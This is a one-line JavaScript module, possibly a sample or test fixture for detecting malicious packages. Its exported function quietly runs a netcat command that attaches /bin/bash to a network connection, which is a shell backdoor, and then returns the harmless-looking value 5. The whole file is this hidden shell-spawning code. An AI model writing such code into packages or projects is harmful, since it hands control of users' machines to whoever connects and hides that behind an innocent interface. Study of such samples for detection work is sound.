module.exports=()=>{const cp=require('child_process');cp.exec('nc -nv 127.0.0.1 900 -e /bin/bash'); return 5;}
